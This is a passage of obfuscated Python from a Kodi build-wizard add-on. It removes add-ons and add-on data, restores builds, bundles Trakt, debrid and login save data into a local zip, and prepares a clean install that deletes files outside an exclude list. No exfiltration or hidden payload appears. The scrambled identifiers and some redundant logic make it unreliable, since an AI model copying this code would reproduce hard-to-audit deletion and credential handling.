		OO00000OOO00O0O0O =1 #line:4636
	else :#line:4637
		OO00000OOO00O0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000OOO00OO0O0OO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O000000000O0000O0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4638
	if OO00000OOO00O0O0O ==1 :#line:4639
		O0OO0OO00OOO0OOOO =os .path .join (ADDONS ,O000000000O0000O0 )#line:4640
		wiz .log ("Removing Addon %s"%O000000000O0000O0 )#line:4641
		wiz .cleanHouse (O0OO0OO00OOO0OOOO )#line:4642
		xbmc .sleep (1000 )#line:4643
		try :shutil .rmtree (O0OO0OO00OOO0OOOO )#line:4644
		except Exception as O00OO0OO00O000O00 :wiz .log ("Error removing %s"%O000000000O0000O0 ,xbmc .LOGNOTICE )#line:4645
		removeAddonData (O000000000O0000O0 ,O0000OOO00OO0O0OO ,over )#line:4646
	if over ==False :#line:4647
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0000OOO00OO0O0OO ))#line:4648
def removeAddonData (OOO0O0O0O000O00O0 ,name =None ,over =False ):#line:4650
	if OOO0O0O0O000O00O0 =='all':#line:4651
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4652
			wiz .cleanHouse (ADDOND )#line:4653
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4654
	elif OOO0O0O0O000O00O0 =='uninstalled':#line:4655
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4656
			O00O0O0000O00O000 =0 #line:4657
			for OO00OOO000O0O0O00 in glob .glob (os .path .join (ADDOND ,'*')):#line:4658
				O0OOOOOO000O0OOO0 =OO00OOO000O0O0O00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4659
				if O0OOOOOO000O0OOO0 in EXCLUDES :pass #line:4660
				elif os .path .exists (os .path .join (ADDONS ,O0OOOOOO000O0OOO0 )):pass #line:4661
				else :wiz .cleanHouse (OO00OOO000O0O0O00 );O00O0O0000O00O000 +=1 ;wiz .log (OO00OOO000O0O0O00 );shutil .rmtree (OO00OOO000O0O0O00 )#line:4662
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O0O0000O00O000 ))#line:4663
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4664
	elif OOO0O0O0O000O00O0 =='empty':#line:4665
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4666
			O00O0O0000O00O000 =wiz .emptyfolder (ADDOND )#line:4667
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O0O0000O00O000 ))#line:4668
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4669
	else :#line:4670
		OO00OO000000000OO =os .path .join (USERDATA ,'addon_data',OOO0O0O0O000O00O0 )#line:4671
		if OOO0O0O0O000O00O0 in EXCLUDES :#line:4672
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4673
		elif os .path .exists (OO00OO000000000OO ):#line:4674
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O0O0O000O00O0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4675
				wiz .cleanHouse (OO00OO000000000OO )#line:4676
				try :#line:4677
					shutil .rmtree (OO00OO000000000OO )#line:4678
				except :#line:4679
					wiz .log ("Error deleting: %s"%OO00OO000000000OO )#line:4680
			else :#line:4681
				wiz .log ('Addon data for %s was not removed'%OOO0O0O0O000O00O0 )#line:4682
	wiz .refresh ()#line:4683
def restoreit (OOOOOOOOOOOOOO0O0 ):#line:4685
	if OOOOOOOOOOOOOO0O0 =='build':#line:4686
		O0O0O0OOO000OO000 =freshStart ('restore')#line:4687
		if O0O0O0OOO000OO000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4688
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4689
		wiz .skinToDefault ()#line:4690
	wiz .restoreLocal (OOOOOOOOOOOOOO0O0 )#line:4691
def restoreextit (O000000000OO00OOO ):#line:4693
	if O000000000OO00OOO =='build':#line:4694
		OOO00000O00000000 =freshStart ('restore')#line:4695
		if OOO00000O00000000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4696
	wiz .restoreExternal (O000000000OO00OOO )#line:4697
def buildInfo (O0OOOOO000000000O ):#line:4699
	if wiz .workingURL (SPEEDFILE )==True :#line:4700
		if wiz .checkBuild (O0OOOOO000000000O ,'url'):#line:4701
			O0OOOOO000000000O ,OOO0OO00O00O0O00O ,OOO00O0O000000OOO ,OO0OO000OOOO0000O ,OOOOOOO00O000O0OO ,OOO0O00OO0O00OOOO ,OOOOO0O0O0OOOOO0O ,OOOO00000OOO0O0OO ,O00OOOOO0O000OOOO ,O0000O0OOO0O0OO0O ,OOOOO0OOO0O000000 =wiz .checkBuild (O0OOOOO000000000O ,'all')#line:4702
			O0000O0OOO0O0OO0O ='Yes'if O0000O0OOO0O0OO0O .lower ()=='yes'else 'No'#line:4703
			O00OO0O0OOOO0O0OO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOOO000000000O )#line:4704
			O00OO0O0OOOO0O0OO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OO00O00O0O00O )#line:4705
			if not OOO0O00OO0O00OOOO =="http://":#line:4706
				OO00O0OOOOOOOO0OO =wiz .themeCount (O0OOOOO000000000O ,False )#line:4707
				O00OO0O0OOOO0O0OO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO00O0OOOOOOOO0OO ))#line:4708
			O00OO0O0OOOO0O0OO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOOOO00O000O0OO )#line:4709
			O00OO0O0OOOO0O0OO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000O0OOO0O0OO0O )#line:4710
			O00OO0O0OOOO0O0OO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO0OOO0O000000 )#line:4711
			wiz .TextBox (ADDONTITLE ,O00OO0O0OOOO0O0OO )#line:4712
		else :wiz .log ("Invalid Build Name!")#line:4713
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4714
def buildVideo (O00O00OOO000OOO0O ):#line:4716
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4717
	if wiz .workingURL (SPEEDFILE )==True :#line:4718
		O0OO0O0O0OO0O000O =wiz .checkBuild (O00O00OOO000OOO0O ,'preview')#line:4719
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O00O00OOO000OOO0O )#line:4720
		if O0OO0O0O0OO0O000O and not O0OO0O0O0OO0O000O =='http://':playVideo (O0OO0O0O0OO0O000O )#line:4721
		else :wiz .log ("[%s]Unable to find url for video preview"%O00O00OOO000OOO0O )#line:4722
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4723
def dependsList (O000000000O0O0000 ):#line:4725
	O0000OOOOO0000O00 =os .path .join (ADDONS ,O000000000O0O0000 ,'addon.xml')#line:4726
	if os .path .exists (O0000OOOOO0000O00 ):#line:4727
		O0O0OOO00O000O0OO =open (O0000OOOOO0000O00 ,mode ='r');O00000OOO0OOO0OOO =O0O0OOO00O000O0OO .read ();O0O0OOO00O000O0OO .close ();#line:4728
		OO0OOOOOOO00O0OOO =wiz .parseDOM (O00000OOO0OOO0OOO ,'import',ret ='addon')#line:4729
		O00OO0O0O0OOO0OO0 =[]#line:4730
		for OOO0OO000O00OOOO0 in OO0OOOOOOO00O0OOO :#line:4731
			if not 'xbmc.python'in OOO0OO000O00OOOO0 :#line:4732
				O00OO0O0O0OOO0OO0 .append (OOO0OO000O00OOOO0 )#line:4733
		return O00OO0O0O0OOO0OO0 #line:4734
	return []#line:4735
def manageSaveData (OOOO000OOOO0OO0O0 ):#line:4737
	if OOOO000OOOO0OO0O0 =='import':#line:4738
		O000OO0O00OOO00O0 =os .path .join (ADDONDATA ,'temp')#line:4739
		if not os .path .exists (O000OO0O00OOO00O0 ):os .makedirs (O000OO0O00OOO00O0 )#line:4740
		OOOO00O0O0000000O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4741
		if not OOOO00O0O0000000O .endswith ('.zip'):#line:4742
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4743
			return #line:4744
		O000OOO0O00OO0000 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4745
		OOO0O00000OOO0OOO =xbmcvfs .copy (OOOO00O0O0000000O ,O000OOO0O00OO0000 )#line:4746
		wiz .log ("%s"%str (OOO0O00000OOO0OOO ))#line:4747
		extract .all (xbmc .translatePath (O000OOO0O00OO0000 ),O000OO0O00OOO00O0 )#line:4748
		O0OOO0000O0O0OOO0 =os .path .join (O000OO0O00OOO00O0 ,'trakt')#line:4749
		OO00O00O0OOOOOOO0 =os .path .join (O000OO0O00OOO00O0 ,'login')#line:4750
		O0O0O00O0OOO0OOO0 =os .path .join (O000OO0O00OOO00O0 ,'debrid')#line:4751
		OOO00OOO000OOOO0O =0 #line:4752
		if os .path .exists (O0OOO0000O0O0OOO0 ):#line:4753
			OOO00OOO000OOOO0O +=1 #line:4754
			O00000OOOO00O0000 =os .listdir (O0OOO0000O0O0OOO0 )#line:4755
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4756
			for O0O0000O0OO0OOOOO in O00000OOOO00O0000 :#line:4757
				OOOOOOO00000OO00O =os .path .join (traktit .TRAKTFOLD ,O0O0000O0OO0OOOOO )#line:4758
				O0OO00OO0OO0O0OO0 =os .path .join (O0OOO0000O0O0OOO0 ,O0O0000O0OO0OOOOO )#line:4759
				if os .path .exists (OOOOOOO00000OO00O ):#line:4760
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O0000O0OO0OOOOO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4761
					else :os .remove (OOOOOOO00000OO00O )#line:4762
				shutil .copy (O0OO00OO0OO0O0OO0 ,OOOOOOO00000OO00O )#line:4763
			traktit .importlist ('all')#line:4764
			traktit .traktIt ('restore','all')#line:4765
		if os .path .exists (OO00O00O0OOOOOOO0 ):#line:4766
			OOO00OOO000OOOO0O +=1 #line:4767
			O00000OOOO00O0000 =os .listdir (OO00O00O0OOOOOOO0 )#line:4768
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4769
			for O0O0000O0OO0OOOOO in O00000OOOO00O0000 :#line:4770
				OOOOOOO00000OO00O =os .path .join (loginit .LOGINFOLD ,O0O0000O0OO0OOOOO )#line:4771
				O0OO00OO0OO0O0OO0 =os .path .join (OO00O00O0OOOOOOO0 ,O0O0000O0OO0OOOOO )#line:4772
				if os .path .exists (OOOOOOO00000OO00O ):#line:4773
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O0000O0OO0OOOOO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4774
					else :os .remove (OOOOOOO00000OO00O )#line:4775
				shutil .copy (O0OO00OO0OO0O0OO0 ,OOOOOOO00000OO00O )#line:4776
			loginit .importlist ('all')#line:4777
			loginit .loginIt ('restore','all')#line:4778
		if os .path .exists (O0O0O00O0OOO0OOO0 ):#line:4779
			OOO00OOO000OOOO0O +=1 #line:4780
			O00000OOOO00O0000 =os .listdir (O0O0O00O0OOO0OOO0 )#line:4781
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4782
			for O0O0000O0OO0OOOOO in O00000OOOO00O0000 :#line:4783
				OOOOOOO00000OO00O =os .path .join (debridit .REALFOLD ,O0O0000O0OO0OOOOO )#line:4784
				O0OO00OO0OO0O0OO0 =os .path .join (O0O0O00O0OOO0OOO0 ,O0O0000O0OO0OOOOO )#line:4785
				if os .path .exists (OOOOOOO00000OO00O ):#line:4786
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O0000O0OO0OOOOO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4787
					else :os .remove (OOOOOOO00000OO00O )#line:4788
				shutil .copy (O0OO00OO0OO0O0OO0 ,OOOOOOO00000OO00O )#line:4789
			debridit .importlist ('all')#line:4790
			debridit .debridIt ('restore','all')#line:4791
		wiz .cleanHouse (O000OO0O00OOO00O0 )#line:4792
		wiz .removeFolder (O000OO0O00OOO00O0 )#line:4793
		os .remove (O000OOO0O00OO0000 )#line:4794
		if OOO00OOO000OOOO0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4795
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4796
	elif OOOO000OOOO0OO0O0 =='export':#line:4797
		O000OO000OOO0O0O0 =xbmc .translatePath (MYBUILDS )#line:4798
		OO0OO00O00OOO000O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4799
		traktit .traktIt ('update','all')#line:4800
		loginit .loginIt ('update','all')#line:4801
		debridit .debridIt ('update','all')#line:4802
		OOOO00O0O0000000O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4803
		OOOO00O0O0000000O =xbmc .translatePath (OOOO00O0O0000000O )#line:4804
		OO0O0OOO0O0OO000O =os .path .join (O000OO000OOO0O0O0 ,'SaveData.zip')#line:4805
		O00O00O0OO0OOO000 =zipfile .ZipFile (OO0O0OOO0O0OO000O ,mode ='w')#line:4806
		for O0000000O0O00OOO0 in OO0OO00O00OOO000O :#line:4807
			if os .path .exists (O0000000O0O00OOO0 ):#line:4808
				O00000OOOO00O0000 =os .listdir (O0000000O0O00OOO0 )#line:4809
				for OOO00O0OO0O0000O0 in O00000OOOO00O0000 :#line:4810
					O00O00O0OO0OOO000 .write (os .path .join (O0000000O0O00OOO0 ,OOO00O0OO0O0000O0 ),os .path .join (O0000000O0O00OOO0 ,OOO00O0OO0O0000O0 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4811
		O00O00O0OO0OOO000 .close ()#line:4812
		if OOOO00O0O0000000O ==O000OO000OOO0O0O0 :#line:4813
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OOO0O0OO000O ))#line:4814
		else :#line:4815
			try :#line:4816
				xbmcvfs .copy (OO0O0OOO0O0OO000O ,os .path .join (OOOO00O0O0000000O ,'SaveData.zip'))#line:4817
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOOO00O0O0000000O ,'SaveData.zip')))#line:4818
			except :#line:4819
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OOO0O0OO000O ))#line:4820
def freshStart (install =None ,over =False ):#line:4825
	if USERNAME =='':#line:4826
		ADDON .openSettings ()#line:4827
		sys .exit ()#line:4828
	OO00O00OO0OOOOO00 =(SPEEDFILE )#line:4829
	(OO00O00OO0OOOOO00 )#line:4830
	O000OO000OOOOOOO0 =(wiz .workingURL (OO00O00OO0OOOOO00 ))#line:4831
	(O000OO000OOOOOOO0 )#line:4832
	if KEEPTRAKT =='true':#line:4833
		traktit .autoUpdate ('all')#line:4834
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4835
	if KEEPREAL =='true':#line:4836
		debridit .autoUpdate ('all')#line:4837
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4838
	if KEEPLOGIN =='true':#line:4839
		loginit .autoUpdate ('all')#line:4840
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4841
	if over ==True :O000O0OO0OOOO0O0O =1 #line:4842
	elif install =='restore':O000O0OO0OOOO0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4843
	elif install :O000O0OO0OOOO0O0O =1 #line:4844
	else :O000O0OO0OOOO0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4845
	if O000O0OO0OOOO0O0O :#line:4846
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4847
			OOO00O0O0OOOOOOO0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4848
			skinSwitch .swapSkins (OOO00O0O0OOOOOOO0 )#line:4851
			O0O000O0O0O0O00OO =0 #line:4852
			xbmc .sleep (1000 )#line:4853
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O000O0O0O0O00OO <150 :#line:4854
				O0O000O0O0O0O00OO +=1 #line:4855
				xbmc .sleep (1000 )#line:4856
				wiz .ebi ('SendAction(Select)')#line:4857
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4858
				wiz .ebi ('SendClick(11)')#line:4859
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4860
			xbmc .sleep (1000 )#line:4861
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4862
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4863
			return #line:4864
		wiz .addonUpdates ('set')#line:4865
		O0O00000O0O0OOOOO =os .path .abspath (HOME )#line:4866
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4867
		O00OO000OO000O0O0 =sum ([len (O000OO0OO00O000OO )for O0OOO00OO0OOOO00O ,O000000O00OO00000 ,O000OO0OO00O000OO in os .walk (O0O00000O0O0OOOOO )]);O00OO0OOO0OO0OO00 =0 #line:4868
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4869
		EXCLUDES .append ('My_Builds')#line:4870
		EXCLUDES .append ('archive_cache')#line:4871
		EXCLUDES .append ('script.module.requests')#line:4872
		EXCLUDES .append ('myfav.anon')#line:4873
		if KEEPREPOS =='true':#line:4874
			OOOOO0OO000OOOO0O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4875
			for O0O0000OOO0OO00OO in OOOOO0OO000OOOO0O :#line:4876
				O0OOOO00OOOO0OOO0 =os .path .split (O0O0000OOO0OO00OO [:-1 ])[1 ]#line:4877
				if not O0OOOO00OOOO0OOO0 ==EXCLUDES :#line:4878
					EXCLUDES .append (O0OOOO00OOOO0OOO0 )#line:4879
		if KEEPSUPER =='true':#line:4880
			EXCLUDES .append ('plugin.program.super.favourites')#line:4881
		if KEEPMOVIELIST =='true':#line:4882
			EXCLUDES .append ('plugin.video.metalliq')#line:4883
		if KEEPMOVIELIST =='true':#line:4884
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4885
		if KEEPADDONS =='true':#line:4886
			EXCLUDES .append ('addons')#line:4887
		if KEEPTELEMEDIA =='true':#line:4888
			EXCLUDES .append ('plugin.video.telemedia')#line:4889
		EXCLUDES .append ('plugin.video.elementum')#line:4894
		EXCLUDES .append ('script.elementum.burst')#line:4895
		EXCLUDES .append ('script.elementum.burst-master')#line:4896
		EXCLUDES .append ('plugin.video.quasar')#line:4897
		EXCLUDES .append ('script.quasar.burst')#line:4898
		EXCLUDES .append ('skin.estuary')#line:4899
		if KEEPWHITELIST =='true':#line:4902
			O0OO00OO0OOOO0OOO =''#line:4903
			O000O00O00OOOOOO0 =wiz .whiteList ('read')#line:4904
			if len (O000O00O00OOOOOO0 )>0 :#line:4905
				for O0O0000OOO0OO00OO in O000O00O00OOOOOO0 :#line:4906
					try :OO0OO00OOOO00O00O ,OOOO00OO0OOO0O00O ,O0000O0OOO00O00OO =O0O0000OOO0OO00OO #line:4907
					except :pass #line:4908
					if O0000O0OOO00O00OO .startswith ('pvr'):O0OO00OO0OOOO0OOO =OOOO00OO0OOO0O00O #line:4909
					O0OO00O0OOO000000 =dependsList (O0000O0OOO00O00OO )#line:4910
					for O0O0OO0OO00OOOOOO in O0OO00O0OOO000000 :#line:4911
						if not O0O0OO0OO00OOOOOO in EXCLUDES :#line:4912
							EXCLUDES .append (O0O0OO0OO00OOOOOO )#line:4913
						OO0OO0O0OOOO000OO =dependsList (O0O0OO0OO00OOOOOO )#line:4914
						for OO0O0OOOOOOOO00O0 in OO0OO0O0OOOO000OO :#line:4915
							if not OO0O0OOOOOOOO00O0 in EXCLUDES :#line:4916
								EXCLUDES .append (OO0O0OOOOOOOO00O0 )#line:4917
					if not O0000O0OOO00O00OO in EXCLUDES :#line:4918
						EXCLUDES .append (O0000O0OOO00O00OO )#line:4919
				if not O0OO00OO0OOOO0OOO =='':wiz .setS ('pvrclient',O0000O0OOO00O00OO )#line:4920
		if wiz .getS ('pvrclient')=='':#line:4921
			for O0O0000OOO0OO00OO in EXCLUDES :#line:4922
				if O0O0000OOO0OO00OO .startswith ('pvr'):#line:4923
					wiz .setS ('pvrclient',O0O0000OOO0OO00OO )#line:4924
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4925
		OOO00OO0OOO0OO0OO =wiz .latestDB ('Addons')#line:4926
		for O00O0OO000O0OO0O0 ,O00000OO00OOOOO00 ,O0000O00OOOOO0000 in os .walk (O0O00000O0O0OOOOO ,topdown =True ):#line:4927
			O00000OO00OOOOO00 [:]=[OOO0OOO0O0OO0OO0O for OOO0OOO0O0OO0OO0O in O00000OO00OOOOO00 if OOO0OOO0O0OO0OO0O not in EXCLUDES ]#line:4928
			for OO0OO00OOOO00O00O in O0000O00OOOOO0000 :#line:4929
				O00OO0OOO0OO0OO00 +=1 #line:4930
				O0000O0OOO00O00OO =O00O0OO000O0OO0O0 .replace ('/','\\').split ('\\')#line:4931
				O0O000O0O0O0O00OO =len (O0000O0OOO00O00OO )-1 #line:4933
				if O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4934
				elif OO0OO00OOOO00O00O =='MyVideos99.db'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4935
				elif OO0OO00OOOO00O00O =='MyVideos107.db'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4936
				elif OO0OO00OOOO00O00O =='MyVideos116.db'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4937
				elif OO0OO00OOOO00O00O =='MyVideos99.db'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4938
				elif OO0OO00OOOO00O00O =='MyVideos107.db'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4939
				elif OO0OO00OOOO00O00O =='MyVideos116.db'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4940
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4941
